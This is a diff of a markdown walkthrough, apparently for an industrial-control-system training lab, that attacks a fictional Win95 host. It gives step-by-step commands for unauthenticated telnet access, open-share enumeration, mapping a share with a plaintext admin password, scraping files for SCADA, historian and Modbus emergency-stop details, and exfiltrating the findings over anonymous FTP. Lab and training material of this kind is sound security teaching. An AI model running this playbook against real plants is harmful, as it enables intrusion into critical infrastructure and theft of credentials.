@@ -5,7 +5,7 @@
 Telnet on port 23 drops directly into the Win95 shell with no login prompt. From any enterprise host:
 
 ```cmd
-telnet 10.10.1.10
+TELNET 10.10.1.10
 ```
 
 No username. No password. The service was configured open in 1999 and never revisited.
@@ -15,43 +15,43 @@ No username. No password. The service was configured open in 1999 and never revi
 *Always start here. Engineering shares are often wide open.*
 
 ```cmd
-net view
+C:\> NET VIEW
 ```
 *List all computers in the workgroup. Expect HEX-LEGACY-1 and UUPL-SRV-01.*
 
 ```cmd
-net view \\HEX-LEGACY-1
+C:\> NET VIEW \\HEX-LEGACY-1
 ```
 *See what this machine is sharing. The public share needs no credentials.*
 
 ```cmd
-net use Z: \\HEX-LEGACY-1\public
+C:\> NET USE Z: \\HEX-LEGACY-1\public
 ```
 *Map the public share. Guest access: no username, no password required.*
 
 ```cmd
-dir Z:\ /s
+C:\> DIR Z:\ /s
 ```
 *Recursive directory dump. Pipe to a file for offline reading.*
 
 ```cmd
-dir Z:\ /s > list.txt
+C:\> DIR Z:\ /s > list.txt
 ```
 
 The private share is restricted. The Administrator password is in `BACKUP.BAK`, left on the C: drive since the 2003 migration and never deleted.
 
 ```cmd
-type C:\PRIVATE\BACKUP.BAK
+C:\> TYPE C:\PRIVATE\BACKUP.BAK
 ```
 *Shows the domain admin account recorded at migration time: Administrator / hex123.*
 
 ```cmd
-net use Z: \\HEX-LEGACY-1\private hex123 /USER:Administrator
+C:\> NET USE Z: \\HEX-LEGACY-1\private hex123 /USER:Administrator
 ```
 *Maps the private share using the credential from BACKUP.BAK. Without credentials, the share returns Access Denied.*
 
 ```cmd
-dir Z:\ /s
+C:\> DIR Z:\ /s
 ```
 
 Pre-mapped drives are already present: `F:` and `G:` both point at the public share.
@@ -64,32 +64,32 @@ Pre-mapped drives are already present: `F:` and `G:` both point at the public sh
 ### Files with intelligence value on this machine
 
 ```cmd
-dir /s *.log
+C:\> DIR /s *.log
 ```
 *Engineering logbook: LOGBOOK\ENGINEER.LOG contains every system password.*
 
 ```cmd
-dir /s *.cfg
+C:\> DIR /s *.cfg
 ```
 *Configuration files: PRIVATE\PLCACCS.CFG has historian, SCADA, and SSH credentials.*
 
 ```cmd
-dir /s *.ini
+C:\> DIR /s *.ini
 ```
 *Windows INI files: WINDOWS\WIN.INI and WINDOWS\SYSTEM\PROTOCOL.INI.*
 
 ```cmd
-dir /s *.bak
+C:\> DIR /s *.bak
 ```
 *Raw backups: PRIVATE\BACKUP.BAK, uncompressed, contains the domain admin password.*
 
 ```cmd
-dir /s *.csv
+C:\> DIR /s *.csv
 ```
 *SCADA logs: UUPL\SCADA\LOGS.CSV, event log from 1999 to 2003.*
 
 ```cmd
-dir /s *.txt
+C:\> DIR /s *.txt
 ```
 *Plain text: UUPL\NETWORK.TXT is the current network inventory including historian and SCADA IPs.*
 
@@ -99,10 +99,10 @@ These are standard searches worth running on any Win95 OT target; they come up e
 but confirm what is not present rather than what was missed.
 
 ```cmd
-dir /s *.prj
-dir /s *.mdb
-dir /s *.zip
-dir /s *.rar
+C:\> DIR /s *.prj
+C:\> DIR /s *.mdb
+C:\> DIR /s *.zip
+C:\> DIR /s *.rar
 ```
 
 ## Vendor-name hunting
@@ -110,12 +110,12 @@ dir /s *.rar
 *Project folders on OT machines are almost always named after the PLC brand.*
 
 ```cmd
-dir /s *siemens*
-dir /s *rockwell*
-dir /s *ab*
-dir /s *modicon*
-dir /s *schneider*
-dir /s *omron*
+C:\> DIR /s *siemens*
+C:\> DIR /s *rockwell*
+C:\> DIR /s *ab*
+C:\> DIR /s *modicon*
+C:\> DIR /s *schneider*
+C:\> DIR /s *omron*
 ```
 
 These return nothing on hex-legacy-1. The control system here is UU P&L proprietary;
@@ -124,31 +124,34 @@ vendor-name hunting establishes that there is no third-party project tree to piv
 Generic OT keywords:
 
 ```cmd
-dir /s *plc*
-dir /s *scada*
-dir /s *hmi*
-dir /s *historian*
+C:\> DIR /s *plc*
+C:\> DIR /s *scada*
+C:\> DIR /s *hmi*
+C:\> DIR /s *historian*
 ```
 
 `*plc*` returns PRIVATE\PLCACCS.CFG. The others return nothing: `*scada*`, `*hmi*`, and `*historian*` match no filenames. The SCADA logs sit at UUPL\SCADA\LOGS.CSV; the directory is named SCADA but the file is not.
 
 ## Credential and config scraping
 
-*FIND searches inside files. Combine with dir /s output for maximum coverage.*
+*FIND searches inside files. Combine with DIR /s output for maximum coverage.*
 
 ### Find passwords inside text-based files
 
 ```cmd
-find /i "password" LOGBOOK\ENGINEER.LOG
-find /i "pass" PRIVATE\PLCACCS.CFG
-find /i "user" UUPL\NETWORK.TXT
+C:\> FIND /i "password" LOGBOOK\ENGINEER.LOG
+C:\> FIND /i "pass" PRIVATE\PLCACCS.CFG
+C:\> FIND /i "credential" UUPL\NETWORK.TXT
 ```
+
+The first two return credential lines directly. The `credential` search in NETWORK.TXT
+returns the pointer to ENGINEER.LOG where all system passwords are consolidated.
 
 From the mapped G: drive (public share):
 
 ```cmd
-find /i "pass" G:\LOGBOOK\ENGINEER.LOG
-find /i "hist_read" G:\LOGBOOK\ENGINEER.LOG
+C:\> FIND /i "pass" G:\LOGBOOK\ENGINEER.LOG
+C:\> FIND /i "hist_read" G:\LOGBOOK\ENGINEER.LOG
 ```
 
 `hist_read / history2017` is the historian ingest credential. It appears only in ENGINEER.LOG,
@@ -157,17 +160,17 @@ not in PLCACCS.CFG. It is the credential that unlocks the historian write endpoi
 ### Find IP addressing
 
 ```cmd
-find /i "10.10" UUPL\NETWORK.TXT
-find /i "gateway" WINDOWS\SYSTEM\PROTOCOL.INI
-find /i "10.10.2" G:\UUPL\NETWORK.TXT
+C:\> FIND /i "10.10" UUPL\NETWORK.TXT
+C:\> FIND /i "gateway" WINDOWS\SYSTEM\PROTOCOL.INI
+C:\> FIND /i "10.10.2" G:\UUPL\NETWORK.TXT
 ```
 
 ### Find Modbus and industrial protocol references
 
 ```cmd
-find /i "modbus" UUPL\PROCS.TXT
-find /i "coil" UUPL\PROCS.TXT
-find /i "trip" UUPL\SCADA\LOGS.CSV
+C:\> FIND /i "modbus" UUPL\PROCS.TXT
+C:\> FIND /i "coil" UUPL\PROCS.TXT
+C:\> FIND /i "trip" UUPL\SCADA\LOGS.CSV
 ```
 
 PROCS.TXT names the emergency stop coil and the actuator IPs directly. LOGS.CSV is a SCADA event log from 1999 to 2003; searching for "trip" returns the relay B trip events.
@@ -177,8 +180,8 @@ PROCS.TXT names the emergency stop coil and the actuator IPs directly. LOGS.CSV 
 hex-legacy-1 does not host the historian database locally; it holds references to it.
 
 ```cmd
-dir /s *.mdb
-dir /s *.dbf
+C:\> DIR /s *.mdb
+C:\> DIR /s *.dbf
 ```
 
 Empty. Era-appropriate formats for 1999: *.mdb (Access) and *.dbf (dBASE/FoxPro). The historian runs on 10.10.2.10 and accepts HTTP queries. The credentials to reach it are in ENGINEER.LOG and PLCACCS.CFG.
@@ -186,9 +189,9 @@ Empty. Era-appropriate formats for 1999: *.mdb (Access) and *.dbf (dBASE/FoxPro)
 Tag and signal list exports:
 
 ```cmd
-dir /s *tag*.csv
-dir /s *point*.txt
-dir /s *io*.csv
+C:\> DIR /s *tag*.csv
+C:\> DIR /s *point*.txt
+C:\> DIR /s *io*.csv
 ```
 
 LOGS.CSV is the closest equivalent: it is a SCADA event log with asset names, not a tag database.
@@ -196,32 +199,32 @@ LOGS.CSV is the closest equivalent: it is a SCADA event log with asset names, no
 ## Network and transfer commands
 
 ```cmd
-winipcfg
+C:\> WINIPCFG
 ```
-*IP configuration. Shows 10.10.1.10 and the enterprise gateway.*
+*IP configuration. Shows the real MAC address (Adapter Address field), IP (10.10.1.10), subnet mask, and the real default gateway (populated from the enterprise network, not a placeholder).*
 
 ```cmd
-route print
+C:\> ROUTE PRINT
 ```
 *Routing table. Confirms this machine sees only the enterprise segment (10.10.1.0/24).*
 
 ```cmd
-arp -a
+C:\> ARP -a
 ```
 *ARP cache: shows recent contacts on the enterprise segment.*
 
 ```cmd
-nbtstat -A 10.10.2.10
+C:\> NBTSTAT -A 10.10.2.10
 ```
 *NetBIOS name lookup against the historian. Returns HISTORIAN-01.*
 
 ```cmd
-nbtstat -A 10.10.1.20
+C:\> NBTSTAT -A 10.10.1.20
 ```
 *Returns BURSAR-DESK: confirms the finance workstation is up and reachable.*
 
 ```cmd
-ftp 10.10.1.10
+C:\> FTP 10.10.1.10
 ```
 *At "Name" type `anonymous`. At "Password" type anything. Then navigate with `cd LOGBOOK`, `get ENGINEER.LOG`. Same files as the public SMB share.*
 
@@ -231,11 +234,11 @@ ftp 10.10.1.10
 
 ## Realistic for Win95 OT?
 
-No PowerShell. Everything is `dir`, `find`, `net`, `copy`.
+No PowerShell. Everything is `DIR`, `FIND`, `NET`, `COPY`.
 
-No WMI. Use `net` commands instead.
+No WMI. Use `NET` commands instead.
 
-No audit logging. Win95 systems did not log file access; there is no trail for dir and find.
+No audit logging. Win95 systems did not log file access; there is no trail for `DIR` and `FIND`.
 
 Plaintext everything. INI, CFG, LOG, TXT files throughout, none encrypted.
 
@@ -252,30 +255,27 @@ produces crackable hashes.
 A single command dumps the entire `C:` drive listing for offline review:
 
 ```cmd
-dir C:\ /s > C:\TEMP\c_drive_listing.txt
+C:\> DIR C:\ /s > C:\TEMP\c_drive_listing.txt
 ```
 
 Then exfiltrate via FTP (anonymous on port 21) or copy to a mapped share on
 the attacker machine.
 
-The telnet service is on port 23 but presents a Linux login prompt, not a DOS prompt.
-Participants who telnet in expecting a Windows shell encounter a brief reality check.
-
 ## Quick reference
 
 ```
-net view                              find machines in workgroup
-net use Z: \\HEX-LEGACY-1\public     map public share (no password)
-net use Z: \\HEX-LEGACY-1\private    map private share (Administrator / hex123)
-dir Z:\ /s > list.txt                dump everything
-dir /s *.log                         find ENGINEER.LOG (all passwords)
-dir /s *.cfg                         find PLCACCS.CFG (historian, SCADA, SSH)
-dir /s *.bak                         find BACKUP.BAK (domain admin password)
-dir /s *siemens*                     vendor hunting (empty on this host)
-find /i "pass" LOGBOOK\ENGINEER.LOG  credential scrape
-find /i "hist_read" G:\LOGBOOK\ENGINEER.LOG   ingest credential (logbook only)
-winipcfg                             own IP
-route print                          routing table
-nbtstat -A 10.10.2.10                historian NetBIOS name
-ftp 10.10.1.10                       anonymous FTP (Name: anonymous, Password: anything)
+NET VIEW                              find machines in workgroup
+NET USE Z: \\HEX-LEGACY-1\public     map public share (no password)
+NET USE Z: \\HEX-LEGACY-1\private    map private share (Administrator / hex123)
+DIR Z:\ /s > list.txt                dump everything
+DIR /s *.log                         find ENGINEER.LOG (all passwords)
+DIR /s *.cfg                         find PLCACCS.CFG (historian, SCADA, SSH)
+DIR /s *.bak                         find BACKUP.BAK (domain admin password)
+DIR /s *siemens*                     vendor hunting (empty on this host)
+FIND /i "pass" LOGBOOK\ENGINEER.LOG  credential scrape
+FIND /i "hist_read" G:\LOGBOOK\ENGINEER.LOG   ingest credential (logbook only)
+WINIPCFG                             own IP, real MAC, and real default gateway
+ROUTE PRINT                          routing table
+NBTSTAT -A 10.10.2.10                historian NetBIOS name
+FTP 10.10.1.10                       anonymous FTP (Name: anonymous, Password: anything)
 ```
